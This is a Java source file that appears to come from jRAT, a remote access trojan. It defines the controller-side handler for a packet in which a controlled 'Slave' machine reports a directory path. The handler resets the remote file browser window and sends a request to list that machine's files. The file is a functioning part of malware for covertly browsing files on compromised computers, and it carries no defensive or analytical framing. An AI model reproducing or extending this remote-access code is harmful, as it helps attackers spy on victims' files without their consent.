package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet15ListFiles;
import io.jrat.client.ui.frames.FrameRemoteFiles;

import java.io.DataInputStream;


public class Packet34CustomDirectory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String where = slave.readLine().replace("/", slave.getFileSeparator()).replace("\\", slave.getFileSeparator());

		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
		if (frame != null) {
			frame.txtDir.setText(where);
			while (frame.model.getRowCount() > 0) {
				frame.model.removeRow(0);
			}
			slave.addToSendQueue(new Packet15ListFiles(where));
		}
	}

}
